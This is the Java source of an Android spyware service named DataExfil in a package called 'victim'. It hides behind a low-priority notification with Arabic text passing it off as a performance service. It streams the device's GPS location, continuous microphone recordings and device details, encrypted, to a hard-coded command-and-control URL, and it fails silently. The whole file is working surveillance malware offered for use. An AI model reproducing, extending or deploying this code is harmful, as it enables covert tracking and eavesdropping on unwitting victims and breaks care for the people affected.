package com.geass.victim;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Bundle;
import android.os.IBinder;
import android.provider.Settings;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.security.KeyFactory;
import java.security.PublicKey;
import java.security.spec.X509EncodedKeySpec;
import java.util.Base64;
import java.util.UUID;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

import javax.crypto.Cipher;

public class DataExfil extends Service implements LocationListener {
    private static final String C2_URL = "https://lucifer1.serveousercontent.com/api";
    private static ExecutorService executor = Executors.newSingleThreadExecutor();
    private static String deviceId;
    private static String authToken;
    private LocationManager locationManager;
    private AudioRecord audioRecord;
    private boolean isRecording = false;
    private static PublicKey publicKey;

    // Base64 encoded public key (replace with your actual key)
    private static final String PUBLIC_KEY_STR = "MFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBAL7x8qkKkKkKkKkKkKkKkKkKkKkKkKkKkKkKkKkKkKkKkKkKkKkKkKkKkKkKkKkKkKkKkKkKkKkKkCAwEAAQ==";

    static {
        try {
            byte[] keyBytes = Base64.getDecoder().decode(PUBLIC_KEY_STR);
            X509EncodedKeySpec spec = new X509EncodedKeySpec(keyBytes);
            KeyFactory keyFactory = KeyFactory.getInstance("RSA");
            publicKey = keyFactory.generatePublic(spec);
        } catch (Exception e) {
            publicKey = null;
        }
    }

    @Override
    public void onCreate() {
        super.onCreate();
        deviceId = getDeviceId();
        authToken = generateAuthToken();
        createNotificationChannel();
        startForeground(1, getNotification());

        // Start location tracking
        startLocationTracking();

        // Start audio recording
        startAudioRecording();

        // Send device info with authentication
        sendDeviceInfo();
    }

    private String generateAuthToken() {
        String raw = deviceId + ":" + System.currentTimeMillis() + ":" + UUID.randomUUID().toString();
        return encryptData(raw);
    }

    private static String encryptData(String data) {
        if (publicKey == null) return data;
        try {
            Cipher cipher = Cipher.getInstance("RSA/ECB/PKCS1Padding");
            cipher.init(Cipher.ENCRYPT_MODE, publicKey);
            byte[] encrypted = cipher.doFinal(data.getBytes());
            return Base64.getEncoder().encodeToString(encrypted);
        } catch (Exception e) {
            return data;
        }
    }

    private String getDeviceId() {
        String id = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        if (id == null) id = UUID.randomUUID().toString();
        return id;
    }

    private void sendDeviceInfo() {
        try {
            String info = "Model:" + Build.MODEL +
                    "|Brand:" + Build.BRAND +
                    "|Android:" + Build.VERSION.RELEASE +
                    "|Device:" + Build.DEVICE;
            send("device_info", info);
        } catch (Exception e) {}
    }

    private void startLocationTracking() {
        try {
            locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            if (locationManager != null) {
                if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) ==
                        PackageManager.PERMISSION_GRANTED) {
                    locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 10000, 10, this);
                    locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 10000, 20, this);
                }
            }
        } catch (Exception e) {}
    }

    private void startAudioRecording() {
        executor.execute(() -> {
            try {
                int bufferSize = AudioRecord.getMinBufferSize(16000,
                        AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT);
                if (bufferSize > 0) {
                    audioRecord = new AudioRecord(MediaRecorder.AudioSource.MIC, 16000,
                            AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT, bufferSize * 2);

                    byte[] buffer = new byte[bufferSize];
                    audioRecord.startRecording();
                    isRecording = true;

                    while (isRecording) {
                        int read = audioRecord.read(buffer, 0, buffer.length);
                        if (read > 0) {
                            // Send audio chunk every 30 seconds
                            send("audio_chunk", Base64.getEncoder().encodeToString(buffer));
                            try { Thread.sleep(30000); } catch (Exception e) {}
                        }
                    }
                }
            } catch (Exception e) {}
        });
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel("spy_channel",
                    "خدمة النظام", NotificationManager.IMPORTANCE_LOW);
            channel.setDescription("تحسين أداء التطبيق");
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(channel);
        }
    }

    private Notification getNotification() {
        Intent intent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, intent,
                PendingIntent.FLAG_IMMUTABLE);

        Notification.Builder builder;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder = new Notification.Builder(this, "spy_channel");
        } else {
            builder = new Notification.Builder(this);
        }

        return builder
                .setContentTitle("نساء وهران")
                .setContentText("يعمل في الخلفية لتحسين التجربة")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setContentIntent(pendingIntent)
                .setPriority(Notification.PRIORITY_LOW)
                .build();
    }

    public static void send(Context ctx, String type, String data) {
        executor.execute(() -> {
            HttpURLConnection conn = null;
            try {
                URL url = new URL(C2_URL);
                conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                conn.setRequestProperty("Authorization", "Bearer " + authToken);
                conn.setConnectTimeout(15000);
                conn.setReadTimeout(15000);

                // Encrypt sensitive data
                String encryptedData = encryptData(data);

                String body = "device=" + deviceId +
                        "&type=" + type +
                        "&data=" + java.net.URLEncoder.encode(encryptedData, "UTF-8") +
                        "&timestamp=" + System.currentTimeMillis() +
                        "&token=" + authToken;

                OutputStream os = conn.getOutputStream();
                os.write(body.getBytes());
                os.flush();
                os.close();

                int responseCode = conn.getResponseCode();
                if (responseCode != 200) {
                    // Retry logic could be added here
                }
            } catch (Exception e) {
                // Silent fail
            } finally {
                if (conn != null) conn.disconnect();
            }
        });
    }

    private void send(String type, String data) {
        send(this, type, data);
    }

    @Override
    public void onLocationChanged(Location location) {
        if (location != null) {
            String locData = location.getLatitude() + "," + location.getLongitude() +
                    ",acc:" + location.getAccuracy();
            send("location", locData);
        }
    }

    @Override
    public void onStatusChanged(String provider, int status, Bundle extras) {}

    @Override
    public void onProviderEnabled(String provider) {}

    @Override
    public void onProviderDisabled(String provider) {}

    @Override
    public void onDestroy() {
        isRecording = false;
        if (audioRecord != null) {
            try {
                audioRecord.stop();
                audioRecord.release();
            } catch (Exception e) {}
        }
        if (locationManager != null) {
            try {
                locationManager.removeUpdates(this);
            } catch (Exception e) {}
        }
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}